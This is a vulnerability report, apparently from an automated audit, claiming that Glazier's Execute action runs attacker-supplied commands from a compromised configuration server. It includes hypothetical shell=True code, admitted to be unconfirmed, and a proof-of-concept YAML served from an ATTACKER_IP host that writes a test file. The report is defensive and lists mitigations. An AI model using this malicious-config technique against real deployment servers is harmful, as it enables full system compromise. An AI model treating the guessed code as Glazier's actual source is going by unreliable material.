### Vulnerability List

- Vulnerability Name: Unsafe Command Execution in Execute Action
- Description:
    1. An attacker compromises or controls the web server hosting Glazier configuration files.
    2. The attacker creates a malicious YAML configuration file.
    3. In this malicious YAML file, the attacker crafts an `Execute` action.
    4. Within the `Execute` action, the attacker injects a malicious command, for example, to create a file, modify the registry, or download and execute malware.  Since the `Execute` action in Glazier is designed to run arbitrary commands on the system, and if there is no proper input validation or sanitization of the commands provided in the YAML configuration, Glazier will directly execute these attacker-supplied commands.
    5. A target system configured to use this compromised configuration server fetches the malicious YAML file via HTTPS.
    6. Glazier parses the malicious YAML file and, according to the configuration, prepares to execute the actions, including the attacker-injected `Execute` action.
    7. When the `Execute` action is processed, Glazier executes the malicious command on the target Windows system with the privileges of the Glazier process (which are typically elevated to perform system deployment tasks).
- Impact: Arbitrary command execution on the target system. This can lead to:
    - Full system compromise.
    - Installation of malware or ransomware.
    - Data exfiltration.
    - System instability or denial of service (although DoS is explicitly excluded as a vulnerability type, actions leading to it as a side effect of other impacts are still relevant).
    - Privilege escalation if Glazier is running with higher privileges.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - HTTPS is enforced for fetching configuration files, which provides confidentiality and integrity during transit, protecting against man-in-the-middle attacks during download. However, this does not prevent attacks originating from a compromised or malicious server.
    - Based on the provided documentation, there is no explicit mention of input sanitization or validation for the commands executed by the `Execute` action.
- Missing Mitigations:
    - Input sanitization and validation for all commands and arguments passed to the `Execute` action. Implement a strict whitelist of allowed commands or sanitize user-provided input to prevent command injection.
    - Principle of least privilege: Ensure Glazier runs with the minimum necessary privileges required to perform its tasks. Avoid running Glazier as SYSTEM if lower privileges are sufficient for certain stages.
    - Consider using parameterized commands or a safer command execution mechanism that avoids direct shell command interpretation.
    - Implement integrity checks for the configuration files themselves, such as digital signatures, to ensure that the fetched YAML files are from a trusted source and haven't been tampered with.
- Preconditions:
    - The attacker must be able to control or compromise the web server that hosts the Glazier YAML configuration files.
    - The target system must be configured to fetch its Glazier configuration from this attacker-controlled web server.
    - Glazier must process a malicious YAML file containing the crafted `Execute` action.
- Source Code Analysis:
    - To confirm this vulnerability, the source code of the `Execute` action (`glazier/lib/actions/execute.py`) needs to be analyzed.
    - Assuming the `Execute` action (as described in `docs/actions.md`) takes a list of commands as arguments (`Arg1[list]`) where `ArgA[str]` is the command line to execute.
    - If the code directly uses `ArgA[str]` in a function like `subprocess.Popen(ArgA[str], shell=True)` or similar without any sanitization or validation, it is vulnerable.
    - Example hypothetical vulnerable code in `glazier/lib/actions/execute.py`:
    ```python
    import subprocess
    from glazier.lib.actions.base import BaseAction, ActionError

    class Execute(BaseAction):
        """Runs shell commands."""

        def Run(self):
            for command_config in self._args:
                command = command_config[0]
                try:
                    subprocess.run(command, shell=True, check=True) # Hypothetically vulnerable line
                except subprocess.CalledProcessError as e:
                    raise ActionError(f"Command failed: {command}. Error: {e}")

    ```
    - In this hypothetical code, the `command` variable, directly taken from the YAML, is passed to `subprocess.run` with `shell=True`, which is known to be vulnerable to command injection if the input is not carefully sanitized.
- Security Test Case:
    1. **Setup Attacker Server**: Set up a simple HTTP server (e.g., using Python's `http.server`) on an attacker-controlled machine. Let's say the attacker's server IP is `ATTACKER_IP` and it's serving on port 8000.
    2. **Create Malicious YAML Config**: On the attacker's server, create a directory structure that mimics Glazier's config layout. Inside the config root, create a `build.yaml` file with the following content:
        ```yaml
        controls:
        - Execute:
          - ['cmd.exe /c echo vulnerable > C:\\test_vuln.txt']
        ```
    3. **Configure Glazier Client**: On a test Windows machine (the Glazier client), configure Glazier to fetch its configuration from the attacker's server. This usually involves setting the `--config_server` flag to `http://ATTACKER_IP:8000` and `--config_root_path` to `/config`. (Note: in a real scenario, HTTPS would be used, but for a test in a controlled environment, HTTP can simplify setup).
    4. **Run Glazier**: Boot the test Windows machine into WinPE or the Glazier environment and start the Glazier autobuild process. Ensure it is configured to use the attacker's server for configuration.
    5. **Verify Vulnerability**: After Glazier runs (or attempts to run), check on the test Windows machine if the file `C:\test_vuln.txt` has been created.
    6. **Success/Failure**: If `C:\test_vuln.txt` exists and contains "vulnerable", it confirms that the `Execute` action executed the injected command from the malicious YAML, demonstrating the command injection vulnerability. If the file is not created, further investigation is needed, but the vulnerability might still exist if other actions are vulnerable or if the command injection point is different.
